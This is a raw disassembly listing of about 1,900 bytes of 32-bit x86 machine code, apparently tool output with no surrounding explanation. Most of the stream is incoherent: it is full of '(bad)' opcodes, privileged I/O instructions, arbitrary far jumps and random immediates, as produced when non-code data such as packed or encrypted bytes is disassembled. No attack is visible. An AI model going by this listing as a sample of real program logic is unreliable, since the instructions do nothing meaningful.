  4093ba:	jo     0x40938a
  4093bc:	pop    edx
  4093bd:	sbb    eax,0xdaac1391
  4093c2:	(bad)  
  4093c4:	out    dx,al
  4093c5:	xlat   BYTE PTR ds:[ebx]
  4093c6:	aas    
  4093c7:	mov    DWORD PTR [edi-0xc],edx
  4093ca:	test   eax,0x7dacd990
  4093cf:	push   0xffffff9c
  4093d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d2:	arpl   di,bp
  4093d4:	and    al,0x63
  4093d6:	sub    DWORD PTR [edi-0x718d935c],ebp
  4093dc:	mov    BYTE PTR [edi-0x4f49e142],al
  4093e2:	jl     0x4093db
  4093e4:	pop    esi
  4093e5:	lea    esi,[ebx]
  4093e7:	(bad)  
  4093e8:	xor    eax,0x1b206f60
  4093ed:	inc    esi
  4093ee:	dec    esp
  4093ef:	fadd   st,st(0)
  4093f1:	jl     0x409382
  4093f3:	dec    eax
  4093f4:	cld    
  4093f5:	xchg   ecx,eax
  4093f6:	retf   0x33d5
  4093f9:	mov    al,ds:0x6c663fd9
  4093fe:	idiv   ah
  409400:	loopne 0x4093c7
  409402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409403:	sub    ebp,DWORD PTR [edx]
  409405:	push   edi
  409406:	dec    ebp
  409407:	jo     0x409391
  409409:	push   eax
  40940a:	add    BYTE PTR [ecx],dl
  40940c:	mov    bh,0xae
  40940e:	inc    ebp
  40940f:	jo     0x4093d5
  409411:	xchg   edx,eax
  409412:	icebp  
  409413:	inc    eax
  409414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409415:	jp     0x4093f3
  409417:	jo     0x4093d4
  409419:	aad    0x8a
  40941b:	std    
  40941c:	outs   dx,BYTE PTR ds:[esi]
  40941d:	pop    esp
  40941e:	xchg   BYTE PTR [esp+edi*4-0x62],dh
  409422:	out    0xce,eax
  409424:	push   eax
  409425:	mov    bh,0x65
  409427:	add    edx,DWORD PTR [ebx-0x1b8475f7]
  40942d:	and    ch,BYTE PTR [eax-0x4514d768]
  409433:	sub    ah,BYTE PTR es:[edi+edi*8+0x28]
  409438:	dec    ecx
  409439:	push   edx
  40943a:	jae    0x4094b5
  40943c:	test   edi,ebx
  40943e:	cmp    eax,0x81322a21
  409443:	pop    ecx
  409444:	mov    cl,0x29
  409446:	inc    esi
  409447:	cli    
  409448:	ret    0x4762
  40944b:	repnz hlt 
  40944d:	arpl   si,bx
  40944f:	mov    ds:0x4dbdb11e,al
  409454:	mov    bl,0x96
  409456:	xchg   edi,eax
  409457:	addr16 sub eax,0x18c97655
  40945d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40945e:	scas   eax,DWORD PTR es:[edi]
  40945f:	ror    DWORD PTR [ecx],cl
  409461:	xchg   ecx,eax
  409462:	addr16 mov ebx,0xc210e7f3
  409468:	test   eax,0xa412e673
  40946d:	(bad)  
  40946f:	sub    eax,0xc1f2f214
  409474:	inc    esp
  409475:	mov    eax,0x926f559d
  40947a:	inc    ebp
  40947b:	loopne 0x409456
  40947d:	add    DWORD PTR [eax],edx
  40947f:	adc    ebx,eax
  409481:	and    al,0xcd
  409483:	stos   DWORD PTR es:[edi],eax
  409484:	adc    BYTE PTR [eax-0x2bb27c3c],cl
  40948a:	jns    0x409483
  40948c:	sub    edi,DWORD PTR [esp+0x35]
  409490:	push   cs
  409491:	and    eax,DWORD PTR [esi]
  409493:	and    al,0xd4
  409495:	stc    
  409496:	cmp    eax,0xa5fa3bca
  40949b:	scas   eax,DWORD PTR es:[edi]
  40949c:	adc    dl,BYTE PTR [edi-0x31]
  40949f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a0:	dec    esp
  4094a1:	clc    
  4094a2:	and    eax,0x1f5a4b17
  4094a7:	mov    cs,edx
  4094a9:	dec    ebx
  4094aa:	jbe    0x409502
  4094ac:	cwde   
  4094ad:	xor    DWORD PTR ds:0xf32159fd,esp
  4094b3:	sbb    BYTE PTR [ebp-0x54],dh
  4094b6:	adc    al,0x8d
  4094b8:	out    0xd7,al
  4094ba:	xor    DWORD PTR [ebp+0x815cd68],0x1aaa4393
  4094c4:	jmp    0x935d:0x97d7393e
  4094cb:	fsub   st,st(1)
  4094cd:	inc    esp
  4094ce:	mov    BYTE PTR [ecx+0x4c],dl
  4094d1:	cmp    bl,BYTE PTR [ebx+0x701baa3b]
  4094d7:	mov    WORD PTR [edx-0x188ef183],?
  4094dd:	pmaxub mm0,QWORD PTR [esi-0x6dbd9eac]
  4094e4:	retf   
  4094e5:	popa   
  4094e6:	mov    ebp,0x31bd2796
  4094eb:	lock std 
  4094ed:	rcr    DWORD PTR [edi+0x62364434],0xa6
  4094f4:	aaa    
  4094f5:	lds    eax,FWORD PTR [edx]
  4094f7:	mov    edi,DWORD PTR [edi-0x7f]
  4094fa:	dec    edx
  4094fb:	bound  esi,QWORD PTR [edx+eiz*4]
  4094fe:	sbb    DWORD PTR [esi-0x2cab9da7],ecx
  409504:	std    
  409505:	sub    BYTE PTR [esi-0xf],0x22
  409509:	xchg   esi,eax
  40950a:	les    ebx,FWORD PTR [eax-0x27]
  40950d:	xchg   dh,ch
  40950f:	call   0x10222201
  409514:	xchg   esi,eax
  409515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409516:	jne    0x40957a
  409518:	loopne 0x40957e
  40951a:	shl    DWORD PTR [ecx+0x38],cl
  40951d:	dec    ecx
  40951e:	sbb    eax,0x91c3d6c
  409523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409524:	or     al,bl
  409526:	jg     0x4094c1
  409528:	(bad)  
  409529:	shl    BYTE PTR [esi],cl
  40952b:	or     DWORD PTR [esi+0xd],0xc6fd2e52
  409532:	in     al,0xe3
  409534:	or     eax,0x7d5899e6
  409539:	test   eax,0x5c09c930
  40953e:	outs   dx,BYTE PTR ds:[esi]
  40953f:	mov    BYTE PTR [edi],bh
  409541:	cli    
  409542:	add    edi,esp
  409544:	sbb    al,0x4c
  409546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409547:	push   0x43
  409549:	(bad)  
  40954a:	out    0x68,al
  40954c:	call   0x58777de3
  409551:	test   al,0x51
  409553:	js     0x409579
  409555:	mov    bl,0x54
  409557:	int    0x2f
  409559:	in     al,dx
  40955a:	xor    BYTE PTR [eax],dl
  40955c:	cmp    dl,dl
  40955e:	push   esi
  40955f:	cmp    BYTE PTR [edi-0x3993d40b],al
  409565:	aas    
  409566:	cli    
  409567:	cdq    
  409568:	cmp    eax,0x67274afe
  40956d:	dec    esp
  40956e:	retf   
  40956f:	xlat   BYTE PTR es:[ebx]
  409571:	cdq    
  409572:	daa    
  409573:	xchg   edi,eax
  409574:	sbb    al,BYTE PTR [edi-0x2e]
  409577:	es iret 
  409579:	lea    ebx,[esi]
  40957b:	jb     0x40952b
  40957d:	adc    edx,DWORD PTR [ebx+ebx*4-0x4fc031f1]
  409584:	aad    0x53
  409586:	mov    ebp,0x537af044
  40958b:	add    edi,DWORD PTR [ebx+0x32d21b9a]
  409591:	xor    ecx,edi
  409593:	mov    al,0xe3
  409595:	dec    ebx
  409596:	in     al,0xe6
  409598:	jecxz  0x409600
  40959a:	cmp    eax,0x2607f291
  40959f:	sub    eax,0x51f71fff
  4095a4:	push   eax
  4095a5:	pop    ss
  4095a6:	pop    esi
  4095a7:	pushf  
  4095a8:	pop    edx
  4095a9:	sub    cl,BYTE PTR [esi]
  4095ab:	out    dx,eax
  4095ac:	lods   al,BYTE PTR ds:[esi]
  4095ad:	stos   BYTE PTR es:[edi],al
  4095ae:	pop    edx
  4095af:	cmp    eax,0xffccfa43
  4095b4:	leave  
  4095b5:	mov    eax,0x7823810b
  4095ba:	xchg   ecx,eax
  4095bb:	inc    esp
  4095bc:	mov    ds:0xdd3369eb,eax
  4095c1:	out    0x22,eax
  4095c3:	aam    0xc9
  4095c5:	cdq    
  4095c6:	push   DWORD PTR [edi+0x19]
  4095c9:	gs ret 
  4095cb:	mov    al,0xeb
  4095cd:	test   DWORD PTR [edi-0x2278e696],edx
  4095d3:	add    BYTE PTR [edi+ebx*2+0x21],0xc2
  4095d8:	dec    ecx
  4095d9:	inc    esp
  4095da:	aaa    
  4095db:	inc    edx
  4095dc:	add    eax,DWORD PTR [eax-0x43]
  4095df:	mov    ecx,0xcfaf0207
  4095e4:	mov    bl,0xa1
  4095e6:	jnp    0x40960f
  4095e8:	jl     0x40964d
  4095ea:	mov    eax,0x1c105dd9
  4095ef:	mov    ds:0xeaa87974,eax
  4095f4:	repnz (bad) 
  4095f6:	stos   DWORD PTR es:[edi],eax
  4095f7:	push   edx
  4095f8:	push   es
  4095f9:	adc    DWORD PTR [edi*2+0x11515b91],0xe
  409601:	aam    0x1
  409603:	push   es
  409604:	mov    cl,0x3d
  409606:	clc    
  409607:	js     0x40965b
  409609:	outs   dx,BYTE PTR ds:[esi]
  40960a:	pushf  
  40960b:	fwait
  40960c:	sub    bh,ah
  40960e:	lahf   
  40960f:	inc    esi
  409610:	test   ecx,ecx
  409612:	lods   eax,DWORD PTR ds:[esi]
  409613:	test   BYTE PTR [esi+ecx*4+0x7a6fe13b],ch
  40961a:	sti    
  40961b:	push   ds
  40961c:	adc    edx,DWORD PTR [edx-0x7415a443]
  409622:	aas    
  409623:	or     eax,0x6b9b4d3a
  409628:	mov    bl,BYTE PTR [ecx]
  40962a:	test   al,0xd0
  40962c:	cwde   
  40962d:	and    eax,0x3b9b97db
  409632:	stc    
  409633:	daa    
  409634:	loopne 0x4096a2
  409636:	cmp    al,0x7
  409638:	retf   
  409639:	lods   eax,DWORD PTR ds:[esi]
  40963a:	or     eax,0xe31058ba
  40963f:	rcl    edx,1
  409641:	cmp    bh,BYTE PTR [ebx+edi*8-0x2a515c73]
  409648:	or     al,dh
  40964a:	loop   0x409648
  40964c:	les    eax,FWORD PTR [edi+esi*2]
  40964f:	lds    esi,FWORD PTR [ecx]
  409651:	jp     0x409621
  409653:	adc    DWORD PTR [ecx-0x7d],edx
  409656:	das    
  409657:	sahf   
  409658:	jae    0x4096d7
  40965a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40965b:	popf   
  40965c:	inc    ecx
  40965d:	in     eax,0xbe
  40965f:	lea    esp,[eax-0x34207169]
  409665:	inc    esp
  409666:	scas   al,BYTE PTR es:[edi]
  409667:	jno    0x4096c9
  409669:	imul   ebx,edx,0x65
  40966c:	add    ch,al
  40966e:	inc    edx
  40966f:	cmp    eax,0xc877762
  409674:	retf   0xe1dd
  409677:	sahf   
  409678:	mov    eax,0x61736a3b
  40967d:	dec    esi
  40967e:	(bad)
  409683:	and    DWORD PTR gs:[edx-0x603108e6],esi
  40968a:	(bad)  
  40968b:	xlat   BYTE PTR ds:[ebx]
  40968c:	retf   0x86fd
  40968f:	mov    dl,0x81
  409691:	rcr    BYTE PTR [ecx-0x521e70c7],0x55
  409698:	mov    ebp,0x2d9e2289
  40969d:	inc    ebx
  40969e:	mov    ds:0xc55bd876,eax
  4096a3:	aas    
  4096a4:	ins    BYTE PTR es:[edi],dx
  4096a5:	shr    BYTE PTR [ecx-0x2a544a36],cl
  4096ab:	push   ds
  4096ac:	imul   esi,esp,0x6cb96542
  4096b2:	pop    ecx
  4096b3:	scas   al,BYTE PTR es:[edi]
  4096b4:	xchg   edx,eax
  4096b5:	aas    
  4096b6:	jl     0x40963e
  4096b8:	sahf   
  4096b9:	inc    eax
  4096ba:	mov    esi,0x91ac20ec
  4096bf:	sbb    eax,0xd08c5192
  4096c4:	lds    eax,FWORD PTR [ebp-0x557571d6]
  4096ca:	fiadd  DWORD PTR [ebx*1-0x46e0da0]
  4096d1:	adc    al,0x67
  4096d3:	jb     0x4096f3
  4096d5:	xor    DWORD PTR [esi],eax
  4096d7:	add    edi,DWORD PTR [ebx+0x4]
  4096da:	lea    ebp,[ebp-0x6f4f3447]
  4096e0:	mov    dl,0x28
  4096e2:	leave  
  4096e3:	popf   
  4096e4:	sbb    BYTE PTR ds:0xa9febe3d,bh
  4096ea:	mov    ?,WORD PTR [esi]
  4096ec:	inc    edi
  4096ed:	jo     0x4096b3
  4096ef:	mov    al,0x9a
  4096f1:	add    DWORD PTR [ebp+0x4e],ebp
  4096f4:	fimul  WORD PTR [edi-0x5b]
  4096f7:	call   0xd570:0xa3d14ae0
  4096fe:	pop    ebx
  4096ff:	daa    
  409700:	xchg   DWORD PTR [ecx+0x1fcd6022],ebp
  409706:	sbb    dl,BYTE PTR [ecx]
  409708:	in     eax,dx
  409709:	pusha  
  40970a:	call   0x3354:0x58052b66
  409711:	test   al,0xd9
  409713:	sbb    edi,ebp
  409715:	jns    0x4096c7
  409717:	xchg   ecx,eax
  409718:	push   eax
  409719:	inc    esp
  40971a:	ins    DWORD PTR es:[edi],dx
  40971b:	hlt    
  40971c:	inc    ecx
  40971d:	add    BYTE PTR [eax+ebx*1],0x86
  409721:	sti    
  409722:	mov    dl,0x9f
  409724:	sbb    esi,DWORD PTR [ebx+0x3d]
  409727:	and    BYTE PTR [ebx-0x42],0xdb
  40972b:	mov    ebp,0x201ef77e
  409730:	push   esi
  409731:	xchg   ecx,eax
  409732:	lahf   
  409733:	and    cl,BYTE PTR ds:0xff796d2b
  409739:	ins    DWORD PTR es:[edi],dx
  40973a:	xchg   edi,eax
  40973b:	inc    edx
  40973c:	xchg   DWORD PTR cs:[edi+0x77],eax
  409740:	mov    edi,0x104b82fc
  409745:	mov    dh,0x6d
  409747:	cmc    
  409748:	and    ch,bh
  40974a:	mov    eax,ds:0xf74fbcc3
  40974f:	adc    ecx,DWORD PTR [ebx]
  409751:	and    ebx,DWORD PTR [ebx]
  409753:	push   es
  409754:	aaa    
  409755:	jge    0x4097ac
  409757:	fdivrp st(3),st
  409759:	or     al,0x35
  40975b:	xor    DWORD PTR [ebx],ecx
  40975d:	push   ebp
  40975e:	mov    ah,BYTE PTR [ecx-0x6d]
  409761:	xor    BYTE PTR [edx-0x6d8b603d],cl
  409767:	inc    ebx
  409768:	jge    0x409786
  40976a:	or     BYTE PTR [edi],al
  40976c:	in     al,dx
  40976d:	test   al,0x8a
  40976f:	inc    ebp
  409770:	xchg   ecx,eax
  409771:	push   ecx
  409772:	jmp    0x40975b
  409774:	imul   esi,DWORD PTR [esi],0x564495fe
  40977a:	(bad)  
  40977b:	mov    bl,0x78
  40977d:	xor    ecx,esp
  40977f:	or     DWORD PTR [esi+0x36],eax
  409782:	popf   
  409783:	mov    edx,0xf04f8be5
  409788:	pop    es
  409789:	jo     0x40976d
  40978b:	ds loopne 0x409755
  40978e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40978f:	mov    edx,0x2ba22a9
  409794:	or     bl,dl
  409796:	pop    ebp
  409797:	gs push ebp
  409799:	jo     0x4097b6
  40979b:	mov    ecx,0x7c010f39
  4097a0:	jge    0x4097a1
  4097a2:	je     0x409726
  4097a4:	in     al,dx
  4097a5:	and    DWORD PTR [ecx],eax
  4097a7:	mov    ch,0x19
  4097a9:	jne    0x409773
  4097ab:	stos   BYTE PTR es:[edi],al
  4097ac:	aam    0x7d
  4097ae:	call   0xdbec985a
  4097b3:	add    BYTE PTR [eax],bl
  4097b5:	leave  
  4097b6:	dec    ebp
  4097b7:	stc    
  4097b8:	jne    0x4097c6
  4097ba:	(bad)  
  4097bb:	push   edx
  4097bc:	int    0x68
  4097be:	xchg   ecx,eax
  4097bf:	and    BYTE PTR [ebp-0x52],0x8d
  4097c3:	sub    eax,0x383d875c
  4097c8:	cmp    BYTE PTR ds:0xffa19d4a,cl
  4097ce:	adc    esp,DWORD PTR [ebp+0x1f7ed84e]
  4097d4:	jl     0x4097f4
  4097d6:	pop    esi
  4097d7:	aas    
  4097d8:	dec    esp
  4097d9:	or     esi,DWORD PTR [eax]
  4097db:	push   cs
  4097dc:	test   eax,0x5279112f
  4097e1:	cmp    al,0x98
  4097e3:	in     al,dx
  4097e4:	test   DWORD PTR [esi+0x5d281d5],ebx
  4097ea:	sbb    al,BYTE PTR [edx+0x39b951c9]
  4097f0:	aad    0xcd
  4097f2:	sub    eax,0xf83e7300
  4097f7:	cmp    dh,BYTE PTR [esi]
  4097f9:	mov    bh,0x4
  4097fb:	jno    0x4097ef
  4097fd:	scas   al,BYTE PTR es:[edi]
  4097fe:	lock pop ebp
  409800:	pop    eax
  409801:	inc    ebx
  409802:	and    eax,0x1620533
  409807:	push   esp
  409808:	mov    es,WORD PTR [ecx-0x66313ec]
  40980e:	sub    bl,BYTE PTR [ecx-0x6b3c4907]
  409814:	fsubrp st(5),st
  409816:	std    
  409817:	gs dec esi
  409819:	pop    es
  40981a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981b:	mov    esp,0x4a37a4f7
  409820:	daa    
  409821:	cmp    al,0x9c
  409823:	pop    esp
  409824:	jno    0x4097f5
  409826:	inc    edx
  409827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409828:	mov    dl,0x99
  40982a:	jge    0x409852
  40982c:	lods   eax,DWORD PTR ds:[esi]
  40982d:	cmp    BYTE PTR [ebp-0xf2fe1a3],dl
  409833:	cmp    eax,0x99a97880
  409838:	retf   0x531f
  40983b:	xchg   edx,eax
  40983c:	(bad)  [esi+0x14b96a96]
  409842:	jbe    0x4098c2
  409844:	mov    edx,0x68525042
  409849:	or     DWORD PTR [edx+0x6e0deb3a],ecx
  40984f:	and    DWORD PTR [edx-0x5aeb02fb],ebx
  409855:	fstp   DWORD PTR [esi+0x6518b95b]
  40985b:	mov    al,ds:0x63efa397
  409860:	adc    DWORD PTR [eax],ebp
  409862:	popa   
  409863:	(bad)  
  409864:	xlat   BYTE PTR ds:[ebx]
  409865:	xchg   edi,eax
  409866:	daa    
  409867:	sbb    ebx,DWORD PTR [ebx-0x7a]
  40986a:	cdq    
  40986b:	jp     0x4098b2
  40986d:	jbe    0x4098ea
  40986f:	xchg   edi,eax
  409870:	imul   edx,DWORD PTR [edi],0xc421e2fa
  409876:	nop
  409877:	cmp    dh,BYTE PTR [ebx]
  409879:	je     0x409869
  40987b:	cmp    esi,DWORD PTR ds:0x2d0265cd
  409881:	pusha  
  409882:	cmp    dl,BYTE PTR [ebx]
  409884:	dec    ebx
  409885:	into   
  409886:	lods   al,BYTE PTR ds:[esi]
  409887:	xchg   ecx,eax
  409888:	fsubr  QWORD PTR [eax+0x38]
  40988b:	es mov al,0x8c
  40988e:	sub    bl,BYTE PTR ds:0x4aa51f89
  409894:	inc    esp
  409895:	scas   al,BYTE PTR es:[edi]
  409896:	mov    eax,ds:0x3f7bc2b9
  40989b:	fs adc eax,0x766b85ed
  4098a1:	fistp  DWORD PTR [ebx+0x7e]
  4098a4:	sub    eax,0xda6089d2
  4098a9:	je     0x409906
  4098ab:	(bad)  
  4098ac:	xchg   ebx,eax
  4098ad:	jae    0x40989f
  4098af:	into   
  4098b0:	dec    edx
  4098b1:	pop    es
  4098b2:	push   ebx
  4098b3:	mov    edx,0x87440e59
  4098b8:	push   esi
  4098b9:	mov    edx,0xfafaf9e1
  4098be:	ins    DWORD PTR es:[edi],dx
  4098bf:	in     al,dx
  4098c0:	enter  0x2ea1,0x6a
  4098c4:	sub    bl,al
  4098c6:	mov    dl,0x1f
  4098c8:	(bad)  
  4098c9:	adc    eax,0x11fe99f9
  4098ce:	mov    ds:0xa29090d0,al
  4098d3:	sub    BYTE PTR [ebx-0x44e09806],bh
  4098d9:	add    DWORD PTR [esp+edi*1-0x76c8b2c2],ebp
  4098e0:	jle    0x409949
  4098e2:	pop    ss
  4098e3:	mov    ds:0x918d4e4c,eax
  4098e8:	push   ss
  4098e9:	icebp  
  4098ea:	(bad)  
  4098eb:	mov    eax,ds:0x65d5c8cf
  4098f0:	dec    ebx
  4098f1:	xchg   BYTE PTR [ebx],ch
  4098f3:	lods   eax,DWORD PTR ds:[esi]
  4098f4:	push   ebp
  4098f5:	mov    ecx,0x67c7efba
  4098fa:	(bad)  
  4098fb:	retf   
  4098fc:	dec    esi
  4098fd:	repz cwde 
  4098ff:	xchg   edi,eax
  409900:	and    edx,0x90637763
  409906:	test   BYTE PTR [si+0xa2],dl
  40990b:	adc    ebx,esp
  40990d:	inc    ecx
  40990e:	add    eax,0xfef44f8e
  409913:	inc    ebx
  409914:	jns    0x409914
  409916:	mov    edi,0x70aa8a95
  40991b:	jecxz  0x4098be
  40991d:	mov    edx,0x96a53ed0
  409922:	and    cl,bl
  409924:	rcr    BYTE PTR [ecx+0x4f],cl
  409927:	imul   edx,DWORD PTR [edi],0xffffff8d
  40992a:	stos   DWORD PTR es:[edi],eax
  40992b:	push   ebx
  40992c:	icebp  
  40992d:	push   edi
  40992e:	shl    DWORD PTR [ecx+0xe],cl
  409931:	jae    0x4098b4
  409933:	(bad)  [ebx-0x32a50948]
  409939:	sub    al,0x12
  40993b:	xchg   esp,eax
  40993c:	xchg   ebp,eax
  40993d:	dec    esi
  40993e:	ret    0xbe1a
  409941:	int    0x18
  409943:	out    dx,eax
  409944:	lea    ecx,[edi-0x125c8f02]
  40994a:	push   eax
  40994b:	pop    ebp
  40994c:	test   al,0x9e
  40994e:	xchg   ebp,eax
  40994f:	add    al,0xc6
  409951:	fwait
  409952:	out    0xcf,al
  409954:	test   ch,cl
  409956:	shl    DWORD PTR [esi+ebx*4+0x72],cl
  40995a:	test   BYTE PTR [eax+0x79b4891a],dl
  409960:	lahf   
  409961:	bound  eax,QWORD PTR [edi]
  409963:	(bad)  
  409964:	xor    al,0xc7
  409966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409967:	pop    ebp
  409968:	fcom   st(3)
  40996a:	shl    BYTE PTR [ecx+ebx*2-0x2fdce5d4],1
  409971:	inc    eax
  409972:	pop    ss
  409973:	mov    ?,WORD PTR [ebp+0x7dabf535]
  409979:	add    al,0xb8
  40997b:	call   0x2bdc:0x7aa5171d
  409982:	idiv   DWORD PTR [esp+eiz*2-0x51]
  409986:	retf   
  409987:	add    BYTE PTR [ebx-0x6bdf8455],al
  40998d:	mov    edi,0xf1909ad9
  409992:	mov    al,ds:0x431f57e9
  409997:	xchg   esp,eax
  409998:	xor    eax,edx
  40999a:	add    BYTE PTR [ecx+0x7ae1608e],ch
  4099a0:	push   ss
  4099a1:	xchg   DWORD PTR [ebx],edx
  4099a3:	inc    edi
  4099a4:	scas   eax,DWORD PTR es:[edi]
  4099a5:	fidivr DWORD PTR [ebp-0x3667c0d3]
  4099ab:	mov    DWORD PTR [eax],edi
  4099ad:	push   0xa8aeb89b
  4099b2:	fstp   TBYTE PTR [ebp+ebx*2+0x274d2339]
  4099b9:	sbb    edi,ebx
  4099bb:	push   esp
  4099bc:	mov    eax,ds:0x5f9aab1f
  4099c1:	(bad)  
  4099c2:	jmp    FWORD PTR [esi-0x49]
  4099c5:	mov    ah,0x0
  4099c7:	call   DWORD PTR [edi+0xd]
  4099ca:	out    dx,eax
  4099cb:	mov    edi,0x8f167fac
  4099d0:	jmp    0xc099:0x24f01fd7
  4099d7:	and    BYTE PTR [ebp-0x683fa388],ah
  4099dd:	in     al,0xe5
  4099df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099e0:	jmp    0x409965
  4099e2:	xchg   esi,eax
  4099e3:	xchg   BYTE PTR [esi],cl
  4099e5:	test   BYTE PTR [ecx-0x33],ch
  4099e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099e9:	add    al,0x3a
  4099eb:	and    edi,DWORD PTR [esi+eax*2+0x59]
  4099ef:	icebp  
  4099f0:	push   esi
  4099f1:	add    al,BYTE PTR [edx+ecx*4+0x38808bf1]
  4099f8:	push   edi
  4099f9:	lds    edi,FWORD PTR [ecx+ecx*4-0x2a]
  4099fd:	jns    0x4099d2
  4099ff:	(bad)  [edx+ecx*8-0x5f]
  409a03:	ret    
  409a04:	add    eax,0x8a835452
  409a09:	sub    al,0xfa
  409a0b:	dec    eax
  409a0c:	cmp    DWORD PTR ds:0x2a7c198d,esp
  409a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a13:	addr16 lahf 
  409a15:	data16 rcl dh,cl
  409a18:	loope  0x409a24
  409a1a:	das    
  409a1b:	dec    esi
  409a1c:	xor    al,0x84
  409a1e:	or     eax,0x640e581d
  409a23:	xchg   esi,eax
  409a24:	icebp  
  409a25:	outs   dx,DWORD PTR ds:[esi]
  409a26:	ss (bad) 
  409a28:	imul   ebp,DWORD PTR [ebx],0x3aae6b04
  409a2e:	jge    0x409aaa
  409a30:	std    
  409a31:	mov    dh,0x58
  409a34:	mov    edi,0xe07c58a3
  409a39:	add    al,0x53
  409a3b:	adc    DWORD PTR fs:[eax-0x51a8c774],edx
  409a42:	dec    esi
  409a43:	sbb    DWORD PTR [ecx],ecx
  409a45:	iret   
  409a46:	xor    al,0xd4
  409a48:	xchg   esi,eax
  409a49:	sub    ah,BYTE PTR [ecx]
  409a4b:	iret   
  409a4c:	jp     0x409a5b
  409a4e:	mov    DWORD PTR [ebp+0x7c4cc2cf],esp
  409a54:	pushf  
  409a55:	and    DWORD PTR [eax],eax
  409a57:	stos   DWORD PTR es:[edi],eax
  409a58:	inc    esi
  409a59:	int    0x15
  409a5b:	ins    BYTE PTR es:[edi],dx
  409a5c:	mov    ds:0x8b8741fd,al
  409a61:	fild   DWORD PTR [ebp-0x50e08d20]
  409a67:	jp     0x409ad3
  409a69:	xor    ecx,edx
  409a6b:	push   esi
  409a6c:	jl     0x409a82
  409a6e:	leave  
  409a6f:	into   
  409a70:	mov    dl,0x3b
  409a72:	pop    ebx
  409a73:	inc    ecx
  409a74:	push   esi
  409a75:	pop    DWORD PTR [esi+edx*4-0x20]
  409a79:	cdq    
  409a7a:	pop    eax
  409a7b:	inc    edx
  409a7c:	gs pop edi
  409a7e:	xchg   edx,eax
  409a7f:	in     al,0x21
  409a81:	mov    cl,0x25
  409a83:	mov    dh,0xe6
  409a85:	sbb    cl,0x28
  409a88:	sar    BYTE PTR [eax+ecx*4-0x7e],0x43
  409a8d:	jno    0x409ad2
  409a8f:	pop    eax
  409a90:	cmc    
  409a91:	mov    DWORD PTR [esi],esi
  409a93:	pop    ss
  409a94:	retf   0x943f
  409a97:	fidiv  DWORD PTR [edx+0x6931b971]
  409a9d:	cld    
  409a9e:	lds    esi,FWORD PTR [esi+0x26]
  409aa1:	adc    al,0x42
  409aa3:	mov    WORD PTR [edx],fs
  409aa5:	xchg   ebp,eax
  409aa6:	das    
  409aa7:	or     bh,BYTE PTR [ebp+0x380f7cf5]
  409aad:	popa   
  409aae:	loope  0x409b21
  409ab0:	(bad)  
  409ab1:	sbb    esp,DWORD PTR [eax+0x2971bcdb]
  409ab7:	xchg   ebp,eax
  409ab8:	js     0x409aab
  409aba:	cmp    ch,BYTE PTR [ebx+0xfa790f9]
  409ac0:	je     0x409ab5
  409ac2:	js     0x409a64
  409ac4:	adc    DWORD PTR [esi+0xc],edx
  409ac7:	outs   dx,BYTE PTR ds:[esi]
  409ac8:	pop    edx
  409ac9:	mov    al,0x24
  409acb:	sub    esp,DWORD PTR [ecx]
  409acd:	or     ch,BYTE PTR [ebp-0x36]
  409ad0:	xor    eax,0xfab44436
  409ad5:	push   esp
  409ad6:	lea    eax,[edi]
  409ad8:	cdq    
  409ad9:	rcl    BYTE PTR ds:0xed9b0b67,0xda
  409ae0:	repz fsub DWORD PTR [edx-0xe543c3d]
  409ae7:	xchg   DWORD PTR [ecx-0x7f6dfaff],ebp
  409aed:	cmp    eax,0x9d640425
  409af2:	icebp  
  409af3:	xlat   BYTE PTR ds:[ebx]
  409af4:	ficomp WORD PTR [edx+esi*1+0x1a]
  409af8:	dec    esp
  409af9:	jp     0x409a83
  409afb:	push   0xffffffbe
  409afd:	adc    bl,dh
  409aff:	stc    
  409b00:	rcl    esp,cl
  409b02:	add    al,0x6f
  409b04:	push   edi
  409b05:	out    0xb8,eax
  409b07:	fdivr  QWORD PTR [ecx-0x29e2b852]
  409b0d:	test   esp,ebx
  409b0f:	jnp    0x409aa8
  409b11:	js     0x409b00
  409b13:	clc    
  409b14:	pushf  
  409b15:	hlt    
  409b16:	into   
  409b17:	fistp  DWORD PTR [edx]
  409b19:	push   edi
  409b1a:	pop    esp
  409b1b:	loop   0x409aec
  409b1d:	pop    ds
  409b1e:	and    BYTE PTR [ebx+eiz*2],dh
  409b21:	retf   0xd3ec
  409b24:	mov    ecx,DWORD PTR [esi+0x31]
  409b27:	adc    al,0x8
  409b29:	push   es
  409b2a:	or     dl,cl
  409b2c:	and    dl,al
  409b2e:	mov    bl,dh
  409b30:	iret   
  409b31:	mov    WORD PTR [edi],cs
  409b33:	pushf  
  409b34:	mul    DWORD PTR ds:0x7a995ff2
  409b3a:	fild   WORD PTR [ecx-0x1e73a02]
  409b40:	sbb    eax,0xc524c4db
  409b45:	mov    BYTE PTR [eax],ch
  409b47:	xor    edx,DWORD PTR [ebx-0xe]
  409b4a:	mov    ecx,0x592f8a55
  409b4f:	adc    dh,BYTE PTR [edx+0x15]
  409b52:	pushf  
  409b53:	xchg   DWORD PTR [edi-0x3ec35379],edx
  409b59:	or     ebp,DWORD PTR ss:[ebp-0x6]
  409b5d:	xchg   esp,eax
  409b5e:	jge    0x409b5a
  409b60:	fs into 
  409b62:	dec    edi
  409b63:	dec    eax
  409b64:	mov    bl,0x2d
  409b66:	add    esi,DWORD PTR [esi+edi*8-0x3e]
  409b6a:	xor    al,0xf9
  409b6c:	in     al,dx
  409b6d:	pop    ss
  409b6e:	jns    0x409b75
  409b70:	jmp    0x9ad122e
  409b75:	mov    eax,0x2e254ec3
  409b7a:	or     al,dl
  409b7c:	adc    eax,DWORD PTR [ecx-0x6f5d9127]
